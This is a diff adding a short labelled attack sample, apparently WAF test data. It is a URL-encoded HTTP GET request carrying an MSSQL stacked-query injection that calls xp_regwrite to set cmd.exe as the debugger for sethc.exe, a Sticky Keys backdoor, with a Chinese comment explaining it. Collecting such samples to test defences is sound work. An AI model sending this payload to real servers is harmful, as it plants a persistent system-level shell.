@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506425
+# 攻击者基于堆叠查询，将"exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger','REG_SZ','C:\windows\system32\cmd.exe'"语句注入到 SQL 查询参数中，目的是通过修改注册表来劫持粘贴键。
+GET /?id=1%3Bexec%20master..xp_regwrite%20%27HKEY_LOCAL_MACHINE%27%2C%27SOFTWARE%5CMicrosoft%5CWindowsNT%5CCurrentVersion%5CImage%20File%20Execution%20Options%5Csethc.exe%27%2C%27Debugger%27%2C%27REG_SZ%27%2C%27C:%5Cwindows%5Csystem32%5Ccmd.exe%27&bid=hd_tag_m8mv26o9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26o9
+RM-PRO-Token: 32211cfb51546fadca7eefb7fa0fa37c
+RM-PRO-Time: 1742808645046
+User-Agent: curl/7.83.1
+
